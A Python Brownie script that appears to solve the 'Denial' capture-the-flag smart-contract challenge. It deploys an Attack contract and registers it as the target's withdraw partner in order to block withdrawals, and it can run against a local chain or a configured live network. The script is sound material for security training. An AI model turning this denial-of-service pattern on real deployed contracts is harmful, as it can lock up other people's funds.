from brownie import Contract, Attack, Denial, network, config
from ...helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def solver():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        denial = Denial.deploy({"from": get_account(index=1)})

        attack = Attack.deploy(denial, {"from": account})

        get_account(index=1).transfer(denial, "1 ether").wait(1)

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                config["networks"][network.show_active()]["infura"]
            )
        )

        denial = Contract.from_abi(
            Denial._name,
            config["networks"][network.show_active()]["denial"],
            Denial.abi,
        )

        attack = Attack.deploy(denial, {"from": account})

    denial.setWithdrawPartner(attack, {"from": account}).wait(1)

    # denial.withdraw({"from": account}).wait(1)


def main():
    solver()
